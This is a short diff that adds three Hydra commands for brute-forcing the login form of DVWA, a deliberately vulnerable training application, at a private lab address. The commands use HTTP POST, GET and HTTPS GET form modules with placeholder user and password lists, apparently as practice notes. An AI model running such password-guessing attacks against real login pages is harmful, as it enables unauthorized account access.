@@ -1,0 +1,8 @@
+hydra -L <wordlist> -P<password list> 192.168.1.101 http-post-form  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+hydra -L <wordlist> -P<password list> 192.168.1.101 http-get-form  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+hydra -L <wordlist> -P<password list> 192.168.1.101 https-get-form  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+
+
